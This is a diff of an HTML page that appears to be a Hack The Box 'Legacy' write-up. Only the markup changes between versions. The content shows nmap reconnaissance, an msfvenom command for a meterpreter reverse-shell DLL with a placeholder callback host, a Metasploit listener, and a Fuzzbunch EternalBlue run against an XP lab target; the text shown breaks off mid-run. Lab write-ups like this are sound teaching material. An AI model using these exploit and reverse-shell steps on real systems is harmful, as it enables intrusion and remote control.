@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.91.2" />
+<meta name="generator" content="Hugo 0.96.0" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -311,31 +311,31 @@ if (language) {
 
 <h2 id="port-scanning">Port scanning</h2>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nmap -A 10.10.10.4
-<span class="err">
-</span><span class="err"></span><span class="go">Nmap scan report for 10.10.10.4
-</span><span class="go">PORT     STATE  SERVICE       VERSION
-</span><span class="go">139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
-</span><span class="go">445/tcp  open   microsoft-ds  Windows XP microsoft-ds
-</span><span class="go">3389/tcp closed ms-wbt-server
-</span><span class="go">Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|PocketPC/CE (91%)
-</span><span class="go">OS CPE: cpe:/o:microsoft:windows_2000 cpe:/o:microsoft:windows_xp 
-</span><span class="go">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Host script results:
-</span><span class="go">|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:aa:ea:dc (VMware)
-</span><span class="go">| smb-os-discovery: 
-</span><span class="go">|   OS: Windows XP (Windows 2000 LAN Manager)
-</span><span class="go">|   OS CPE: cpe:/o:microsoft:windows_xp::-
-</span><span class="go">|   Computer name: legacy
-</span><span class="go">|   NetBIOS computer name: LEGACY\x00
-</span><span class="go">|   Workgroup: HTB\x00
-</span><span class="go">| smb-security-mode: 
-</span><span class="go">|   account_used: &lt;blank&gt;
-</span><span class="go">|   authentication_level: user
-</span><span class="go">|   challenge_response: supported
-</span><span class="go">|_  message_signing: disabled (dangerous, but default)
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo nmap -A 10.10.10.4
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Nmap scan report for 10.10.10.4
+</span></span></span><span class="line"><span class="cl"><span class="go">PORT     STATE  SERVICE       VERSION
+</span></span></span><span class="line"><span class="cl"><span class="go">139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
+</span></span></span><span class="line"><span class="cl"><span class="go">445/tcp  open   microsoft-ds  Windows XP microsoft-ds
+</span></span></span><span class="line"><span class="cl"><span class="go">3389/tcp closed ms-wbt-server
+</span></span></span><span class="line"><span class="cl"><span class="go">Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|PocketPC/CE (91%)
+</span></span></span><span class="line"><span class="cl"><span class="go">OS CPE: cpe:/o:microsoft:windows_2000 cpe:/o:microsoft:windows_xp 
+</span></span></span><span class="line"><span class="cl"><span class="go">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Host script results:
+</span></span></span><span class="line"><span class="cl"><span class="go">|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:aa:ea:dc (VMware)
+</span></span></span><span class="line"><span class="cl"><span class="go">| smb-os-discovery: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   OS: Windows XP (Windows 2000 LAN Manager)
+</span></span></span><span class="line"><span class="cl"><span class="go">|   OS CPE: cpe:/o:microsoft:windows_xp::-
+</span></span></span><span class="line"><span class="cl"><span class="go">|   Computer name: legacy
+</span></span></span><span class="line"><span class="cl"><span class="go">|   NetBIOS computer name: LEGACY\x00
+</span></span></span><span class="line"><span class="cl"><span class="go">|   Workgroup: HTB\x00
+</span></span></span><span class="line"><span class="cl"><span class="go">| smb-security-mode: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   account_used: &lt;blank&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">|   authentication_level: user
+</span></span></span><span class="line"><span class="cl"><span class="go">|   challenge_response: supported
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  message_signing: disabled (dangerous, but default)
+</span></span></span></code></pre></div></div>
 
 <h1 id="exploitation">Exploitation</h1>
 
@@ -343,368 +343,368 @@ if (language) {
 
 <p>Install wine and winetricks using the package manager of your linux distro.
 We initiate a wine32 environment (you may need to install 32-bit packages)
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nv">WINEPREFIX</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$HOME</span><span class="s2">/.wine-fuzzbunch&#34;</span> <span class="nv">WINEARCH</span><span class="o">=</span>win32 wine wineboot
-</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nv">WINEPREFIX</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$HOME</span><span class="s2">/.wine-fuzzbunch&#34;</span> <span class="nv">WINEARCH</span><span class="o">=</span>win32 wine wineboot
+</span></span></code></pre></div></div></p>
 
 <p>Install python26 via winetricks
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nv">WINEPREFIX</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$HOME</span><span class="s2">/.wine-fuzzbunch&#34;</span> winetricks python26
-</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nv">WINEPREFIX</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$HOME</span><span class="s2">/.wine-fuzzbunch&#34;</span> winetricks python26
+</span></span></code></pre></div></div></p>
 
 <p>Get files from git
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nb">cd</span> <span class="nv">$HOME</span>/.wine-fuzzbunch/drive_c <span class="o">&amp;&amp;</span> git clone https://github.com/mdiazcl/fuzzbunch-debian
-</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">cd</span> <span class="nv">$HOME</span>/.wine-fuzzbunch/drive_c <span class="o">&amp;&amp;</span> git clone https://github.com/mdiazcl/fuzzbunch-debian
+</span></span></code></pre></div></div></p>
 
 <p>I have written a little script to run fuzzbunch:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nano /usr/local/bin/fuzzbunch 
-<span class="go">    export WINEPREFIX=$HOME/.wine-fuzzbunch
-</span><span class="go">    cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows
-</span><span class="go">    wine ../../Python26/python.exe fb.py
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="gp">$ </span>sudo chmod +x /usr/local/bin/fuzzbunch
-</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo nano /usr/local/bin/fuzzbunch 
+</span></span><span class="line"><span class="cl"><span class="go">    export WINEPREFIX=$HOME/.wine-fuzzbunch
+</span></span></span><span class="line"><span class="cl"><span class="go">    cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows
+</span></span></span><span class="line"><span class="cl"><span class="go">    wine ../../Python26/python.exe fb.py
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> sudo chmod +x /usr/local/bin/fuzzbunch
+</span></span></code></pre></div></div></p>
 
 <p>Making the shellcode payload
 We need a DLL shellcode payload. You can use msfvenom to make it or anything else you like:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nb">cd</span> <span class="nv">$HOME</span>/.wine-fuzzbunch/drive_c/
-<span class="gp">$ </span>msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=[</span>INSERT_YOUR_IP_HERE<span class="o">]</span> <span class="nv">LPORT</span><span class="o">=</span><span class="m">60000</span> -f dll -o shell.dll
-<span class="err">
-</span><span class="err"></span><span class="go">No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-</span><span class="go">No Arch selected, selecting Arch: x86 from the payload
-</span><span class="go">No encoder or badchars specified, outputting raw payload
-</span><span class="go">Payload size: 333 bytes
-</span><span class="go">Final size of dll file: 5120 bytes
-</span><span class="go">Saved as: shell.dll
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">cd</span> <span class="nv">$HOME</span>/.wine-fuzzbunch/drive_c/
+</span></span><span class="line"><span class="cl"><span class="gp">$</span> msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=[</span>INSERT_YOUR_IP_HERE<span class="o">]</span> <span class="nv">LPORT</span><span class="o">=</span><span class="m">60000</span> -f dll -o shell.dll
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span></span><span class="line"><span class="cl"><span class="go">No Arch selected, selecting Arch: x86 from the payload
+</span></span></span><span class="line"><span class="cl"><span class="go">No encoder or badchars specified, outputting raw payload
+</span></span></span><span class="line"><span class="cl"><span class="go">Payload size: 333 bytes
+</span></span></span><span class="line"><span class="cl"><span class="go">Final size of dll file: 5120 bytes
+</span></span></span><span class="line"><span class="cl"><span class="go">Saved as: shell.dll
+</span></span></span></code></pre></div></div></p>
 
 <h2 id="setting-up-the-listener">Setting up the listener</h2>
 
 <p>Again, you can use whatever listener you like. Here, I use the handler from metasploit:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>msfconsole
-<span class="go">msf &gt; use exploit/multi/handler 
-</span><span class="go">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
-</span><span class="go">msf exploit(handler) &gt; set LHOST=INSERT_YOUR_IP_HERE
-</span><span class="go">msf exploit(handler) &gt; set LPORT 60000
-</span><span class="go">msf exploit(handler) &gt; exploit
-</span><span class="go">[*] Exploit running as background job 0.
-</span><span class="go">[*] Started reverse TCP handler on YOUR_IP_HERE:60000
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> msfconsole
+</span></span><span class="line"><span class="cl"><span class="go">msf &gt; use exploit/multi/handler 
+</span></span></span><span class="line"><span class="cl"><span class="go">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+</span></span></span><span class="line"><span class="cl"><span class="go">msf exploit(handler) &gt; set LHOST=INSERT_YOUR_IP_HERE
+</span></span></span><span class="line"><span class="cl"><span class="go">msf exploit(handler) &gt; set LPORT 60000
+</span></span></span><span class="line"><span class="cl"><span class="go">msf exploit(handler) &gt; exploit
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Exploit running as background job 0.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Started reverse TCP handler on YOUR_IP_HERE:60000
+</span></span></span></code></pre></div></div></p>
 
 <h2 id="running-fuzzbunch">Running fuzzbunch</h2>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>fuzzbunch 
-<span class="err">
-</span><span class="err"></span><span class="go">[*] Loading Plugins
-</span><span class="go">[*] Initializing Fuzzbunch v3.5.1
-</span><span class="go">[*] Adding Global Variables
-</span><span class="go">[+] Set ResourcesDir =&gt; C:\fuzzbunch-debian\windows\Resources
-</span><span class="go">[+] Set Color =&gt; True
-</span><span class="go">[+] Set ShowHiddenParameters =&gt; False
-</span><span class="go">[+] Set NetworkTimeout =&gt; 60
-</span><span class="go">[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs
-</span><span class="go">[*] Autorun ON
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[+] Set FbStorage =&gt; C:\fuzzbunch-debian\windows\storage
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[*] Retargetting Session
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[?] Default Target IP Address [] : 10.10.10.4
-</span><span class="go">[?] Default Callback IP Address [] : [INSERT_YOUR_IP_HERE]     
-</span><span class="go">[?] Use Redirection [yes] : no
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[?] Base Log directory [C:\fuzzbunch-debian\logs] : 
-</span><span class="go">[*] Checking C:\fuzzbunch-debian\logs for projects
-</span><span class="go">Index     Project                 
-</span><span class="go">-----     -------                 
-</span><span class="go">0         Create a New Project    
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[?] Project [0] : 0
-</span><span class="go">[?] New Project Name : LEGACY
-</span><span class="go">[?] Set target log directory to &#39;C:\fuzzbunch-debian\logs\legacy\z10.10.10.4&#39;? [Yes] : 
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[*] Initializing Global State
-</span><span class="go">[+] Set TargetIp =&gt; 10.10.10.4
-</span><span class="go">[+] Set CallbackIp =&gt; [INSERT_YOUR_IP_HERE]
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[!] Redirection OFF
-</span><span class="go">[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs\legacy\z10.10.10.4
-</span><span class="go">[+] Set Project =&gt; legacy
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> fuzzbunch 
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Loading Plugins
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Initializing Fuzzbunch v3.5.1
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Adding Global Variables
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set ResourcesDir =&gt; C:\fuzzbunch-debian\windows\Resources
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set Color =&gt; True
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set ShowHiddenParameters =&gt; False
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set NetworkTimeout =&gt; 60
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Autorun ON
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] Set FbStorage =&gt; C:\fuzzbunch-debian\windows\storage
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Retargetting Session
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[?] Default Target IP Address [] : 10.10.10.4
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] Default Callback IP Address [] : [INSERT_YOUR_IP_HERE]     
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] Use Redirection [yes] : no
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[?] Base Log directory [C:\fuzzbunch-debian\logs] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Checking C:\fuzzbunch-debian\logs for projects
+</span></span></span><span class="line"><span class="cl"><span class="go">Index     Project                 
+</span></span></span><span class="line"><span class="cl"><span class="go">-----     -------                 
+</span></span></span><span class="line"><span class="cl"><span class="go">0         Create a New Project    
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[?] Project [0] : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] New Project Name : LEGACY
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] Set target log directory to &#39;C:\fuzzbunch-debian\logs\legacy\z10.10.10.4&#39;? [Yes] : 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Initializing Global State
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set TargetIp =&gt; 10.10.10.4
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set CallbackIp =&gt; [INSERT_YOUR_IP_HERE]
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] Redirection OFF
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs\legacy\z10.10.10.4
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set Project =&gt; legacy
+</span></span></span></code></pre></div></div>
 
 <h3 id="executing-eternalblue">Executing EternalBlue</h3>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">fb &gt; use EternalBlue
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[!] Entering Plugin Context :: Eternalblue
-</span><span class="go">[*] Applying Global Variables
-</span><span class="go">[+] Set NetworkTimeout =&gt; 60
-</span><span class="go">[+] Set TargetIp =&gt; 10.10.10.4
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[*] Applying Session Parameters
-</span><span class="go">[*] Running Exploit Touches
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[!] Enter Prompt Mode :: Eternalblue
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Module: Eternalblue
-</span><span class="go">===================
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[?] Prompt For Variable Settings? [Yes] : y
-</span><span class="go">[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.
-</span><span class="go">[?] NetworkTimeout [60] : 
-</span><span class="go">[*]  TargetIp :: Target IP Address
-</span><span class="go">[?] TargetIp [10.10.10.4] : 
-</span><span class="go">[*]  TargetPort :: Port used by the SMB service for exploit connection
-</span><span class="go">[?] TargetPort [445] : 
-</span><span class="go">[*]  VerifyTarget :: Validate the SMB string from target against the target selected before exploitation.
-</span><span class="go">[?] VerifyTarget [True] : 
-</span><span class="go">[*]  VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor before throwing. This option must be enabled for multiple exploit attempts.
-</span><span class="go">[?] VerifyBackdoor [True] : 
-</span><span class="go">[*]  MaxExploitAttempts :: Number of times to attempt the exploit and groom. Disabled for XP/2K3.
-</span><span class="go">[?] MaxExploitAttempts [3] : 
-</span><span class="go">[*]  GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetup allocations (XK/2K3) to do.
-</span><span class="go">[?] GroomAllocations [12] : 
-</span><span class="go">[*]  Target :: Operating System, Service Pack, and Architecture of target OS
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">*-&gt; 0) XP            Windows XP 32-Bit All Service Packs
-</span><span class="go">    1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[?] Target [1] : 0
-</span><span class="go">[+] Set Target =&gt; XP
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[!] Preparing to Execute Eternalblue
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[*]  Mode :: Delivery mechanism
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">    0) DANE     Forward deployment via DARINGNEOPHYTE
-</span><span class="go">*-&gt; 1) FB       Traditional deployment from within FUZZBUNCH
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[?] Mode [0] : 1
-</span><span class="go">[+] Run Mode: FB
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[?] This will execute locally like traditional Fuzzbunch plugins. Are you sure? (y/n) [Yes] : y
-</span><span class="go">[*] Redirection OFF
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[+] Configure Plugin Local Tunnels
-</span><span class="go">[+] Local Tunnel - local-tunnel-1
-</span><span class="go">[?] Destination IP [10.10.10.4] : 
-</span><span class="go">[?] Destination Port [445] : 
-</span><span class="go">[+] (TCP) Local 10.10.10.4:445
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[+] Configure Plugin Remote Tunnels
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">fb &gt; use EternalBlue
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] Entering Plugin Context :: Eternalblue
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Applying Global Variables
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set NetworkTimeout =&gt; 60
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set TargetIp =&gt; 10.10.10.4
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Applying Session Parameters
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Running Exploit Touches
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] Enter Prompt Mode :: Eternalblue
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Module: Eternalblue
+</span></span></span><span class="line"><span class="cl"><span class="go">===================
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[?] Prompt For Variable Settings? [Yes] : y
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] NetworkTimeout [60] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  TargetIp :: Target IP Address
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] TargetIp [10.10.10.4] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  TargetPort :: Port used by the SMB service for exploit connection
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] TargetPort [445] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  VerifyTarget :: Validate the SMB string from target against the target selected before exploitation.
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] VerifyTarget [True] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor before throwing. This option must be enabled for multiple exploit attempts.
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] VerifyBackdoor [True] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  MaxExploitAttempts :: Number of times to attempt the exploit and groom. Disabled for XP/2K3.
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] MaxExploitAttempts [3] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetup allocations (XK/2K3) to do.
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] GroomAllocations [12] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  Target :: Operating System, Service Pack, and Architecture of target OS
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">*-&gt; 0) XP            Windows XP 32-Bit All Service Packs
+</span></span></span><span class="line"><span class="cl"><span class="go">    1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[?] Target [1] : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set Target =&gt; XP
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] Preparing to Execute Eternalblue
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*]  Mode :: Delivery mechanism
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    0) DANE     Forward deployment via DARINGNEOPHYTE
+</span></span></span><span class="line"><span class="cl"><span class="go">*-&gt; 1) FB       Traditional deployment from within FUZZBUNCH
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[?] Mode [0] : 1
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Run Mode: FB
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[?] This will execute locally like traditional Fuzzbunch plugins. Are you sure? (y/n) [Yes] : y
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Redirection OFF
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] Configure Plugin Local Tunnels
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Local Tunnel - local-tunnel-1
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] Destination IP [10.10.10.4] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] Destination Port [445] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] (TCP) Local 10.10.10.4:445
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] Configure Plugin Remote Tunnels
+</span></span></span></code></pre></div></div>
 
 <p>These are our final settings for EternalBlue:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">Module: Eternalblue
-</span><span class="go">===================
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Name                  Value                                                 
-</span><span class="go">----                  -----                                                 
-</span><span class="go">DaveProxyPort         0                                                     
-</span><span class="go">NetworkTimeout        60                                                    
-</span><span class="go">TargetIp              10.10.10.4                                            
-</span><span class="go">TargetPort            445                                                   
-</span><span class="go">VerifyTarget          True                                                  
-</span><span class="go">VerifyBackdoor        True                                                  
-</span><span class="go">MaxExploitAttempts    3                                                     
-</span><span class="go">GroomAllocations      12                                                    
-</span><span class="go">ShellcodeBuffer                                                             
-</span><span class="go">Target                XP
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Module: Eternalblue
+</span></span></span><span class="line"><span class="cl"><span class="go">===================
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Name                  Value                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go">----                  -----                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go">DaveProxyPort         0                                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">NetworkTimeout        60                                                    
+</span></span></span><span class="line"><span class="cl"><span class="go">TargetIp              10.10.10.4                                            
+</span></span></span><span class="line"><span class="cl"><span class="go">TargetPort            445                                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">VerifyTarget          True                                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">VerifyBackdoor        True                                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">MaxExploitAttempts    3                                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">GroomAllocations      12                                                    
+</span></span></span><span class="line"><span class="cl"><span class="go">ShellcodeBuffer                                                             
+</span></span></span><span class="line"><span class="cl"><span class="go">Target                XP
+</span></span></span></code></pre></div></div></p>
 
 <p>Now let&rsquo;s execute it:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">[?] Execute Plugin? [Yes] : y    
-</span><span class="go">[*] Executing Plugin
-</span><span class="go">[*] Connecting to target for exploitation.
-</span><span class="go">    [+] Connection established for exploitation.
-</span><span class="go">[*] Pinging backdoor...
-</span><span class="go">    [+] Backdoor not installed, game on.
